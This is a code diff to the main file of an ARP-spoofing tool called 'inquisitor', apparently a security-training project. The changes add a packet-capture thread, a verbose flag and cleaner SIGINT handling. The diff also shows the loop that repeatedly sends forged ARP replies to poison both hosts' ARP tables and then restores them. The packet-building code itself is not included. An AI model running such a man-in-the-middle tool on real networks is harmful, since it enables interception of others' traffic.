@@ -1,7 +1,5 @@
 #include "../inc/inquisitor.h"
 
-int status_loop = 1;
-
 void init_inqui(t_inquisitor *inquisitor, char **av) {
   inquisitor->ip_src = (int8_t *) av[1];
   inquisitor->mac_src = (int8_t *) av[2];
@@ -26,23 +24,32 @@ void init_inqui(t_inquisitor *inquisitor, char **av) {
 }
 
 void handler_sigint(int sig) {
-  (void)sig;
-  dprintf(1, YELLOW "WARNING: SIGINT received, aborting the attack...\n" RESET);
-  status_loop = 0;
+  if (sig == SIGINT) {
+    dprintf(1, YELLOW "WARNING: SIGINT received, aborting the attack...\n" RESET);
+    pcap_breakloop(g_handler);
+    status_loop = false;
+  }
 }
 
 int main(int ac, char **av) {
   t_inquisitor inquisitor;
 
-  if (ac != 5)
-    error("Usage", "sudo ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>", nullptr, 0, nullptr);
+  if (ac != 5 && ac != 6)
+    error("Usage", "sudo ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target> -v(if needed)", nullptr, 0, nullptr);
+  if (ac == 6) {
+    verbose = true;
+    av[5] = nullptr;
+  }
   signal(SIGINT, handler_sigint);
   init_inqui(&inquisitor, av);
+  std::thread spoofer(capture_packet, &inquisitor);
+  dprintf(1, GREEN "LOG: Starting attack...\n" RESET);
   while (status_loop) {
     send_fake_arp_packet(&inquisitor, 1); // alter target arp tables
     send_fake_arp_packet(&inquisitor, 2); // alter source arp tables
     sleep(1);
   }
+  spoofer.join();
   restore_arp_tables(&inquisitor, 1);
   restore_arp_tables(&inquisitor, 2);
   close(inquisitor.sock);
